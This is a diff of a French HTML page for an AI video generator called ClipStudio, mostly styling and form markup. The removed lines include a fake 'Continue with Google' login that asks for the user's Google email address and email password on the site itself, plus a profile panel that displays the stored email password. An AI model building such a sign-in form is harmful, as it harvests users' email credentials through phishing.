-            background: rgba(255,255,255,0.02);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            font-size: 13px;
-            color: var(--text-muted);
-            font-style: italic;
-        }
-
-        .result-actions {
-            display: flex;
-            gap: var(--spacing-md);
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .result-btn {
-            padding: 14px 32px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: var(--radius-md);
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .result-btn.primary {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            box-shadow: 0 4px 20px rgba(255,0,110,0.25);
-        }
-
-        .result-btn.primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 28px rgba(255,0,110,0.35);
-        }
-
-        .result-btn.secondary {
-            background: var(--bg-elevated);
-            color: var(--text);
-            border: 1px solid var(--border);
-        }
-
-        .result-btn.secondary:hover {
-            background: rgba(255,255,255,0.06);
-            border-color: var(--border-hover);
-        }
-
-        /* ===== CREATIONS ===== */
-        .creations {
-            position: relative;
-            z-index: 10;
-            padding: var(--spacing-2xl) 5vw;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .section-title {
-            font-size: clamp(24px, 3vw, 36px);
-            font-weight: 800;
-            margin-bottom: var(--spacing-md);
-        }
-
-        .section-subtitle {
-            font-size: 16px;
-            color: var(--text-muted);
-            margin-bottom: var(--spacing-2xl);
-        }
-
-        .creations-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-            gap: var(--spacing-md);
-        }
-
-        .creation-card {
-            position: relative;
-            border-radius: var(--radius-lg);
-            overflow: hidden;
-            background: var(--bg-elevated);
-            border: 1px solid var(--border);
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            aspect-ratio: 16/10;
-        }
-
-        .creation-card:hover {
-            transform: translateY(-4px);
-            border-color: var(--border-hover);
-            box-shadow: 0 20px 60px -10px rgba(0,0,0,0.5), 0 0 40px rgba(255,0,110,0.08);
-        }
-
-        .creation-thumb {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, rgba(255,0,110,0.15), rgba(131,56,236,0.15));
-            position: relative;
-            overflow: hidden;
-        }
-
-        .creation-play {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.15);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            transform: scale(0.8);
-            transition: all 0.3s ease;
-            position: relative;
-            z-index: 2;
-        }
-
-        .creation-play svg {
-            width: 16px;
-            height: 16px;
-            margin-left: 2px;
-        }
-
-        .creation-card:hover .creation-play {
-            opacity: 1;
-            transform: scale(1);
-        }
-
-        .creation-meta {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: var(--spacing-md);
-            background: linear-gradient(180deg, transparent 0%, rgba(0,0,0,0.8) 100%);
-            transform: translateY(10px);
-            opacity: 0;
-            transition: all 0.3s ease;
-            z-index: 2;
-        }
-
-        .creation-card:hover .creation-meta {
-            transform: translateY(0);
-            opacity: 1;
-        }
-
-        .creation-meta h4 {
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .creation-meta span {
-            font-size: 11px;
-            color: var(--text-muted);
-        }
-
-        .creations-empty {
-            text-align: center;
-            padding: var(--spacing-2xl) var(--spacing-lg);
-            grid-column: 1 / -1;
-        }
-
-        .empty-icon {
-            font-size: 48px;
-            margin-bottom: var(--spacing-lg);
-            opacity: 0.3;
-        }
-
-        .empty-text {
-            font-size: 16px;
-            color: var(--text-muted);
-            margin-bottom: var(--spacing-md);
-        }
-
-        /* ===== INSPIRATION ===== */
-        .inspiration {
-            position: relative;
-            z-index: 10;
-            padding: var(--spacing-2xl) 5vw;
-            background: linear-gradient(180deg, transparent 0%, rgba(255,0,110,0.03) 50%, transparent 100%);
-        }
-
-        .inspiration-content {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .inspiration-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-            gap: var(--spacing-md);
-        }
-
-        .inspiration-card {
-            position: relative;
-            border-radius: var(--radius-lg);
-            overflow: hidden;
+        .enhance-content {
             background: var(--bg-card);
             border: 1px solid var(--border);
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            aspect-ratio: 16/10;
-        }
-
-        .inspiration-card:hover {
-            transform: translateY(-4px);
-            border-color: var(--border-hover);
-            box-shadow: 0 16px 40px -10px rgba(0,0,0,0.4);
-        }
-
-        .inspiration-thumb {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .inspiration-gradient {
-            position: absolute;
-            inset: 0;
-            opacity: 0.6;
-        }
-
-        .inspiration-card:nth-child(1) .inspiration-gradient {
-            background: linear-gradient(135deg, #ff006e, #8338ec);
-        }
-        .inspiration-card:nth-child(2) .inspiration-gradient {
-            background: linear-gradient(135deg, #3a86ff, #06ffa5);
-        }
-        .inspiration-card:nth-child(3) .inspiration-gradient {
-            background: linear-gradient(135deg, #f59e0b, #ef4444);
-        }
-        .inspiration-card:nth-child(4) .inspiration-gradient {
-            background: linear-gradient(135deg, #8b5cf6, #ec4899);
-        }
-        .inspiration-card:nth-child(5) .inspiration-gradient {
-            background: linear-gradient(135deg, #06b6d4, #3b82f6);
-        }
-        .inspiration-card:nth-child(6) .inspiration-gradient {
-            background: linear-gradient(135deg, #10b981, #3b82f6);
-        }
-
-        .inspiration-pattern {
-            position: absolute;
-            inset: 0;
-            opacity: 0.15;
-            background-image: url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='1' fill-rule='evenodd'%3E%3Cpath d='M0 40L40 0H20L0 20M40 40V20L20 40'/%3E%3C/g%3E%3C/svg%3E");
-        }
-
-        .inspiration-play {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.15);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            transform: scale(0.8);
-            transition: all 0.3s ease;
-            position: relative;
-            z-index: 3;
-        }
-
-        .inspiration-play svg {
-            width: 16px;
-            height: 16px;
-            margin-left: 2px;
-        }
-
-        .inspiration-card:hover .inspiration-play {
-            opacity: 1;
-            transform: scale(1);
-        }
-
-        .inspiration-info {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: var(--spacing-md);
-            background: linear-gradient(180deg, transparent 0%, rgba(0,0,0,0.8) 100%);
-            transform: translateY(10px);
-            opacity: 0;
-            transition: all 0.3s ease;
-            z-index: 3;
-        }
-
-        .inspiration-card:hover .inspiration-info {
-            transform: translateY(0);
-            opacity: 1;
-        }
-
-        .inspiration-info h4 {
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-
-        .inspiration-info .meta {
-            display: flex;
-            gap: var(--spacing-sm);
-            font-size: 11px;
-            color: var(--text-muted);
-        }
-
-        /* ===== FEATURES ===== */
-        .features {
-            position: relative;
-            z-index: 10;
-            padding: var(--spacing-2xl) 5vw;
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: var(--spacing-lg);
-        }
-
-        .feature-card {
-            padding: var(--spacing-xl);
-            background: var(--bg-elevated);
-            border: 1px solid var(--border);
             border-radius: var(--radius-lg);
+            padding: 32px;
+            max-width: 500px;
+            width: 100%;
+            animation: cardIn 0.3s ease;
+        }
+
+        .enhance-content h2 {
+            font-size: 20px;
+            margin-bottom: 16px;
+        }
+
+        .enhance-result {
+            margin-top: 16px;
+            padding: 12px 16px;
+            background: rgba(255,0,110,0.05);
+            border: 1px solid rgba(255,0,110,0.2);
+            border-radius: var(--radius-md);
+            display: none;
+        }
+
+        .enhance-result textarea {
+            width: 100%;
+            min-height: 100px;
+            background: transparent;
+            border: none;
+            color: var(--text);
+            font-size: 12px;
+            font-family: inherit;
+            resize: none;
+        }
+
+        .enhance-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+            display: none;
+        }
+
+        .enhance-actions button {
+            flex: 1;
+            padding: 8px 16px;
+            border: none;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
             transition: all 0.3s ease;
         }
 
-        .feature-card:hover {
-            border-color: var(--border-hover);
-            transform: translateY(-4px);
-            box-shadow: 0 16px 40px -10px rgba(0,0,0,0.4);
+        .enhance-reject {
+            background: rgba(239,68,68,0.1);
+            color: var(--danger);
+            border: 1px solid rgba(239,68,68,0.2);
         }
 
-        .feature-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: var(--radius-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: var(--spacing-lg);
-            font-size: 24px;
+        .enhance-reject:hover {
+            background: rgba(239,68,68,0.2);
         }
 
-        .feature-card:nth-child(1) .feature-icon {
-            background: rgba(255,0,110,0.1);
-        }
-        .feature-card:nth-child(2) .feature-icon {
-            background: rgba(131,56,236,0.1);
-        }
-        .feature-card:nth-child(3) .feature-icon {
-            background: rgba(58,134,255,0.1);
-        }
-        .feature-card:nth-child(4) .feature-icon {
-            background: rgba(16,185,129,0.1);
-        }
-
-        .feature-card h3 {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: var(--spacing-sm);
-        }
-
-        .feature-card p {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.6;
-        }
-
-        /* ===== FOOTER ===== */
-        .footer {
-            position: relative;
-            z-index: 10;
-            padding: var(--spacing-2xl) 5vw var(--spacing-lg);
-            background: linear-gradient(180deg, transparent 0%, rgba(255,0,110,0.02) 100%);
-            border-top: 1px solid var(--border);
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: var(--spacing-2xl);
-            margin-bottom: var(--spacing-2xl);
-        }
-
-        .footer-section h3 {
-            font-size: 13px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            color: var(--text-muted);
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section li {
-            margin-bottom: var(--spacing-sm);
-        }
-
-        .footer-section a {
-            font-size: 14px;
-            color: var(--text-muted);
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-
-        .footer-section a:hover {
-            color: var(--text);
-        }
-
-        .footer-bottom {
-            border-top: 1px solid var(--border);
-            padding-top: var(--spacing-lg);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-size: 13px;
-            color: var(--text-dim);
-            flex-wrap: wrap;
-            gap: var(--spacing-md);
-        }
-
-        /* ===== TOAST ===== */
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            padding: 14px 28px;
-            background: rgba(20,20,45,0.95);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
+        .enhance-accept {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
             color: white;
-            font-size: 14px;
-            font-weight: 500;
-            backdrop-filter: blur(20px);
-            z-index: 300;
-            opacity: 0;
-            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
-            max-width: 90%;
         }
 
-        .toast.show {
-            transform: translateX(-50%) translateY(0);
-            opacity: 1;
+        .enhance-accept:hover {
+            transform: translateY(-1px);
         }
 
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 768px) {
-            .navbar {
-                padding: var(--spacing-sm) 20px;
-                gap: var(--spacing-md);
-            }
-
-            .nav-center {
-                display: none;
-            }
-
-            .nav-credits {
-                display: none;
-            }
-
-            .hero {
-                padding: 120px 20px 40px;
-            }
-
-            .generator {
-                padding: 0 20px var(--spacing-xl);
-            }
-
-            .generator-card {
-                padding: var(--spacing-lg);
-            }
-
-            .settings-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .generate-section {
-                flex-direction: column-reverse;
-                align-items: stretch;
-            }
-
-            .generate-info {
-                text-align: center;
-            }
-
-            .generate-btn {
-                width: 100%;
-                justify-content: center;
-            }
-
-            .creations, .inspiration, .features, .footer {
-                padding: var(--spacing-xl) 20px;
-            }
-
-            .creations-grid, .inspiration-grid {
-                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            }
-
-            .features-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-content {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-bottom {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .prompt-tools {
-                justify-content: center;
-            }
-
-            .result-actions {
-                flex-direction: column;
-            }
-
-            .result-btn {
-                width: 100%;
-                justify-content: center;
-            }
-        }
-
-        @media (max-width: 480px) {
-            :root {
-                --spacing-lg: 16px;
-                --spacing-xl: 20px;
-            }
-
-            .hero h1 {
-                font-size: 28px;
-            }
-
-            .generator-card {
-                padding: var(--spacing-md);
-            }
-
-            .settings-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .creations-grid, .inspiration-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .pill {
-                min-height: 44px;
-            }
-
-            .generate-btn {
-                padding: 12px 20px;
-                font-size: 14px;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            * {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
-
-        button:focus-visible,
-        a:focus-visible {
-            outline: 2px solid var(--primary);
-            outline-offset: 2px;
-        }
     </style>
 </head>
 <body>
-    <!-- SVG Definitions -->
-    <svg width="0" height="0" style="position:absolute;">
-        <defs>
-            <linearGradient id="progressGradient" x1="0%" y1="0%" x2="100%" y2="0%">
-                <stop offset="0%" stop-color="#ff006e"/>
-                <stop offset="100%" stop-color="#8338ec"/>
-            </linearGradient>
-        </defs>
-    </svg>
-
-    <!-- Background -->
-    <div class="mesh-bg"></div>
-    <div class="stars"></div>
-    <div class="particles" id="particles"></div>
-
-    <!-- LOGIN SCREEN -->
-    <div class="login-screen" id="loginScreen">
-        <div class="login-card">
-            <div class="login-header">
-                <div class="login-logo-wrap">
-                    <svg width="36" height="36" viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+    <!-- Navigation et layout -->
+    <nav id="navbar">
+        <div class="logo">🎬 ClipStudio</div>
+        <div class="nav-right">
+            <div id="navAvatar" class="nav-avatar">S</div>
+            <div id="userInfoPanel" class="user-info-panel">
+                <div class="user-info-header">
+                    <h3>Profil</h3>
+                    <button id="closeUserPanel" class="close-user-panel">✕</button>
                 </div>
-                <h1>ClipStudio</h1>
-                <p>Créez. Montez. Partagez.</p>
+                <div class="user-info-item">
+                    <label>Utilisateur</label>
+                    <span id="infoUsername">—</span>
+                </div>
+                <div class="user-info-item">
+                    <label>Email</label>
+                    <span id="infoEmail">—</span>
+                </div>
+                <div class="user-info-item">
+                    <label>Connecté</label>
+                    <span id="infoConnectedAt">—</span>
+                </div>
+                <button id="logoutBtn" class="logout-btn">Déconnexion</button>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container page-section">
+        <div class="generator">
+            <div class="generator-content">
+                <h1>Créez des vidéos IA professionnelles</h1>
+                <p>Transformez vos idées en vidéos cinématographiques en quelques secondes.</p>
+                <div class="feature-list">
+                    <div class="feature-item">
+                        <span class="feature-icon">✨</span>
+                        <span class="feature-text">Génération ultra-rapide avec IA dernière génération</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🎨</span>
+                        <span class="feature-text">Styles visuels professionnels</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">⚙️</span>
+                        <span class="feature-text">Contrôle total de la durée et de la résolution</span>
+                    </div>
+                </div>
             </div>
 
-            <!-- STEP 1: GOOGLE BUTTON -->
-            <div id="loginStep1" class="login-form">
-                <button id="googleSignInBtn" type="button" class="google-sign-in-btn">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v12M6 12h12"/></svg>
-                    Continuer avec Google
-                </button>
-            </div>
-
-            <!-- STEP 2: GOOGLE EMAIL & PASSWORD -->
-            <form id="googleStep2Form" class="login-form" style="display: none;" novalidate>
-                <button type="button" class="back-btn" id="backFromGoogle">← Retour</button>
-                <h2 style="font-size: 20px; font-weight: 700; margin: 20px 0 10px; text-align: center;">Connectez-vous avec Google</h2>
-                <p style="text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 20px;">Entrez vos identifiants Google</p>
-
-                <div class="form-group">
-                    <label class="form-label" for="googleEmail">Adresse email</label>
-                    <div class="input-wrap">
-                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
-                        <input type="email" id="googleEmail" class="form-input" placeholder="vous@gmail.com" required autocomplete="email">
+            <form class="generator-form">
+                <div class="prompt-input-wrap">
+                    <div class="form-section-title">Votre idée vidéo</div>
+                    <textarea id="promptInput" class="prompt-input" placeholder="Décrivez votre vidéo. Ex: Une montagne enneigée au coucher du soleil avec des aigles qui volent..."></textarea>
+                    <div class="input-actions">
+                        <span class="char-count"><span id="charCount">0</span>/500</span>
+                        <button id="enhanceBtn" type="button" class="enhance-btn">✨ Améliorer</button>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label class="form-label" for="googlePassword">Mot de passe de l'adresse email</label>
-                    <div class="input-wrap">
-                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                        <input type="password" id="googlePassword" class="form-input" placeholder="••••••••" required autocomplete="current-password">
+                <div class="options-grid">
+                    <div class="option-group">
+                        <div class="form-section-title">Durée</div>
+                        <div class="option-buttons">
+                            <button type="button" class="option-btn active" data-option="duration" data-value="5">5s</button>
+                            <button type="button" class="option-btn" data-option="duration" data-value="10">10s</button>
+                            <button type="button" class="option-btn" data-option="duration" data-value="15">15s</button>
+                            <button type="button" class="option-btn" data-option="duration" data-value="30">30s</button>
+                        </div>
+                    </div>
+                    <div class="option-group">
+                        <div class="form-section-title">Style</div>
+                        <div class="option-buttons">
+                            <button type="button" class="option-btn active" data-option="style" data-value="cinéma">Cinéma</button>
+                            <button type="button" class="option-btn" data-option="style" data-value="animation">Animation</button>
+                            <button type="button" class="option-btn" data-option="style" data-value="documentaire">Doc.</button>
+                            <button type="button" class="option-btn" data-option="style" data-value="fantaisie">Fantaisie</button>
+                        </div>
+                    </div>
+                    <div class="option-group">
+                        <div class="form-section-title">Résolution</div>
+                        <div class="option-buttons">
+                            <button type="button" class="option-btn" data-option="resolution" data-value="720">720p</button>
+                            <button type="button" class="option-btn active" data-option="resolution" data-value="1080">1080p</button>
+                            <button type="button" class="option-btn" data-option="resolution" data-value="1440">1440p</button>
+                            <button type="button" class="option-btn" data-option="resolution" data-value="4k">4K</button>
+                        </div>
+                    </div>
+                    <div class="option-group">
+                        <div class="form-section-title">Format</div>
+                        <div class="option-buttons">
+                            <button type="button" class="option-btn" data-option="ratio" data-value="16:9">16:9</button>
+                            <button type="button" class="option-btn active" data-option="ratio" data-value="9:16">9:16</button>
+                            <button type="button" class="option-btn" data-option="ratio" data-value="1:1">1:1</button>
+                            <button type="button" class="option-btn" data-option="ratio" data-value="4:3">4:3</button>
+                        </div>
                     </div>
                 </div>
 
-                <button type="submit" class="login-submit" id="googleStep2Submit">Continuer</button>
+                <div class="action-buttons">
+                    <button id="generateBtn" type="button" class="btn btn-primary">
+                        <span>Générer</span>
+                        <div id="btnSpinner" class="spinner"></div>
+                    </button>
+                    <button type="button" class="btn btn-secondary">Exemples</button>
+                </div>
             </form>
         </div>
     </div>
 
-    <!-- Navbar -->
-    <nav class="navbar">
-        <a href="#" class="nav-brand">
-            <div class="nav-logo">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-            </div>
-            ClipStudio
-        </a>
-        <div class="nav-center">
-            <div class="nav-links">
-                <a href="#generator" class="nav-link active">Créer</a>
-                <a href="#creations" class="nav-link">Mes créations</a>
-                <a href="#footer" class="nav-link">Aide</a>
-            </div>
-        </div>
-        <div class="nav-right">
-            <div class="nav-credits">
-                <span>⚡</span>
-                <span id="credits">100 crédits</span>
-            </div>
-            <div class="nav-avatar" title="Profil" id="navAvatar" style="cursor: pointer;">S</div>
-        </div>
-    </nav>
+    <!-- FIN PARTIE 2 - Continuez avec partie3.html -->
+</body>
+</html><!-- PARTIE 3 - Overlays, grille et JavaScript -->
 
-    <!-- USER INFO PANEL -->
-    <div id="userInfoPanel" style="position: fixed; top: 70px; right: 20px; width: 350px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; backdrop-filter: blur(20px); z-index: 99; display: none; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
-            <h3 style="font-size: 16px; font-weight: 700; margin: 0;">Informations</h3>
-            <button id="closeUserPanel" type="button" style="background: none; border: none; color: var(--text); font-size: 20px; cursor: pointer;">✕</button>
-        </div>
-        <div style="display: flex; flex-direction: column; gap: 12px; font-size: 13px;">
-            <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px;">
-                <div style="color: var(--text-muted); margin-bottom: 4px;">Nom d'utilisateur</div>
-                <div style="color: var(--text); font-weight: 600;" id="infoUsername">-</div>
+    <!-- GENERATION OVERLAY -->
+    <div id="generationOverlay" class="generation-overlay">
+        <div class="generation-content">
+            <div class="progress-circle-wrap">
+                <svg class="progress-circle" viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="80" class="progress-bg"/>
+                    <circle cx="100" cy="100" r="80" class="progress-fill" id="progressFill"/>
+                </svg>
+                <div class="progress-text">
+                    <div class="progress-percent" id="progressPercent">0%</div>
+                    <div class="progress-label">Génération en cours…</div>
+                </div>
             </div>
-            <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px;">
-                <div style="color: var(--text-muted); margin-bottom: 4px;">Email</div>
-                <div style="color: var(--text); font-weight: 600; word-break: break-all;" id="infoEmail">-</div>
+            <div class="steps-timeline">
+                <div class="step-icon pending" id="step1">○</div>
+                <div class="step-line"></div>
+                <div class="step-icon pending" id="step2">○</div>
+                <div class="step-line"></div>
+                <div class="step-icon pending" id="step3">○</div>
+                <div class="step-line"></div>
+                <div class="step-icon pending" id="step4">○</div>
             </div>
-            <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px;">
-                <div style="color: var(--text-muted); margin-bottom: 4px;">Mot de passe email</div>
-                <div style="color: var(--text); font-weight: 600;" id="infoEmailPassword">••••••••</div>
-            </div>
-            <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px;">
-                <div style="color: var(--text-muted); margin-bottom: 4px;">Mot de passe principal</div>
-                <div style="color: var(--text); font-weight: 600;" id="infoPassword">••••••••</div>
-            </div>
-            <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px;">
-                <div style="color: var(--text-muted); margin-bottom: 4px;">Connecté à</div>
-                <div style="color: var(--text); font-weight: 600;" id="infoConnectedAt">-</div>
-            </div>
-            <button id="logoutBtn" type="button" style="padding: 10px; background: linear-gradient(135deg, #ff006e, #8338ec); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px;">Se déconnecter</button>
         </div>
     </div>
 
-    <!-- Hero -->
-    <section class="hero">
-        <div class="hero-badge">
-            <span class="pulse"></span>
-            Génération vidéo IA
-        </div>
-        <h1>Transformez vos idées en <span class="gradient-text">vidéos magiques</span></h1>
-        <p class="hero-subtitle">Décrivez votre scène en quelques mots. ClipStudio la transforme en vidéo cinématographique en moins de 30 secondes.</p>
-        <p class="hero-social">Rejoignez <strong>10K+ créateurs</strong> qui génèrent leurs vidéos chaque jour</p>
-    </section>
+    <!-- RESULT OVERLAY -->
+    <div id="resultOverlay" class="result-overlay">
+        <div class="result-content">
+            <div class="result-video">
+                <div class="video-frame">
+                    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" stroke="currentColor" stroke-width="2"/>
+                        <polygon points="40,30 40,70 70,50" fill="currentColor"/>
+                    </svg>
+                </div>
+                <button id="resultPlay" class="result-play-btn">Lire</button>
+            </div>
 
-    <!-- Generator -->
-    <section class="generator" id="generator">
-        <div class="generator-card">
-            <!-- Prompt Input -->
-            <div class="generator-section">
-                <label class="generator-label" for="promptInput">Votre idée</label>
-                <textarea class="prompt-textarea" id="promptInput" placeholder="Décrivez votre vidéo… Ex: Un paysage cyberpunk la nuit avec néons roses, pluie, reflets sur l'asphalte, caméra travelling"></textarea>
-                <div class="prompt-tools">
-                    <button class="btn-small" id="enhanceBtn" type="button">✨ Améliorer</button>
-                    <button class="btn-small" id="clearBtn" type="button">🗑️ Effacer</button>
-                    <span style="margin-left: auto; font-size: 12px; color: var(--text-dim);">
-                        <span id="charCount">0</span>/500
-                    </span>
+            <div class="result-info">
+                <h2>Votre vidéo est prête</h2>
+                <p id="resultPromptDisplay"></p>
+                <div class="result-tags">
+                    <span id="tagDuration" class="tag">⏱️ 5s</span>
+                    <span id="tagStyle" class="tag">🎨 Cinéma</span>
+                    <span id="tagResolution" class="tag">📐 1080p</span>
+                    <span id="tagRatio" class="tag">🖥️ 9:16</span>
                 </div>
             </div>
 
-            <!-- Reference Image -->
-            <div class="generator-section">
-                <label class="generator-label">Image de référence (optionnel)</label>
-                <div class="reference-upload" id="uploadArea">
-                    <div id="uploadPlaceholder" class="upload-placeholder">
-                        <div class="upload-icon">📸</div>
-                        <div class="upload-text">Glissez une image ou cliquez</div>
-                        <div class="upload-hint">JPG, PNG (max 10MB)</div>
-                    </div>
-                    <div id="referencePreview" style="display: none;">
-                        <img id="referenceImg" src="" alt="Reference">
-                        <button class="reference-remove" id="removeReference" type="button" aria-label="Supprimer">✕</button>
-                    </div>
-                </div>
-                <input type="file" id="imageInput" accept="image/*" style="display: none;">
-            </div>
-
-            <!-- Settings -->
-            <div class="generator-section">
-                <label class="generator-label">Paramètres</label>
-                <div class="settings-grid">
-                    <div class="setting-group">
-                        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Durée</label>
-                        <div class="setting-pills">
-                            <button class="pill active" data-duration="5" type="button">5s</button>
-                            <button class="pill" data-duration="10" type="button">10s</button>
-                            <button class="pill" data-duration="15" type="button">15s</button>
-                        </div>
-                    </div>
-                    <div class="setting-group">
-                        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Style</label>
-                        <div class="setting-pills">
-                            <button class="pill active" data-style="realistic" type="button">Réaliste</button>
-                            <button class="pill" data-style="cinematic" type="button">Cinématique</button>
-                            <button class="pill" data-style="anime" type="button">Anime</button>
-                            <button class="pill" data-style="3d" type="button">3D</button>
-                        </div>
-                    </div>
-                    <div class="setting-group">
-                        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Résolution</label>
-                        <div class="setting-pills">
-                            <button class="pill" data-resolution="720" type="button">720p</button>
-                            <button class="pill active" data-resolution="1080" type="button">1080p</button>
-                            <button class="pill" data-resolution="4k" type="button">4K</button>
-                        </div>
-                    </div>
-                    <div class="setting-group">
-                        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Format</label>
-                        <div class="setting-pills">
-                            <button class="pill active" data-ratio="16:9" type="button">16:9</button>
-                            <button class="pill" data-ratio="9:16" type="button">9:16</button>
-                            <button class="pill" data-ratio="1:1" type="button">1:1</button>
-                        </div>
-                    </div>
-                </div>
-
-                <button class="advanced-toggle" id="advancedToggle" type="button">
-                    ⚙️ Paramètres avancés
-                    <span class="chevron">▼</span>
-                </button>
-                <div class="advanced-settings" id="advancedSettings">
-                    <div class="setting-group">
-                        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Qualité</label>
-                        <div class="setting-pills">
-                            <button class="pill" data-quality="standard" type="button">Standard</button>
-                            <button class="pill active" data-quality="high" type="button">Haute</button>
-                            <button class="pill" data-quality="ultra" type="button">Ultra</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Generate Button -->
-            <div class="generate-section">
-                <div class="generate-info">
-                    Génération : <strong id="costDisplay">10 crédits</strong>
-                </div>
-                <button class="generate-btn" id="generateBtn" type="button" disabled>
-                    <span>Générer</span>
